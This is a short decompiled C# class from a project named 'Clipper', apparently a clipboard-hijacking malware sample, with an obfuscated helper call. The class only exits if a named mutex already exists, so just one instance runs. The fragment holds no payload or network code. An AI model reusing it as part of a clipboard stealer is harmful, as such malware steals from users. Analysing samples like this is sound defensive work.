using System;
using System.Threading;

namespace Clipper.Modules
{
	// Token: 0x0200000B RID: 11
	internal class AppMutex
	{
		// Token: 0x06000019 RID: 25 RVA: 0x000027B0 File Offset: 0x000009B0
		public static void Check()
		{
			bool flag = false;
			new Mutex(false, config.mutex, ref flag);
			if (!flag)
			{
				Environment.Exit(1);
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x0000223C File Offset: 0x0000043C
		public AppMutex()
		{
			Class2.ecUkQ4xzjKxn7();
			base..ctor();
		}
	}
}
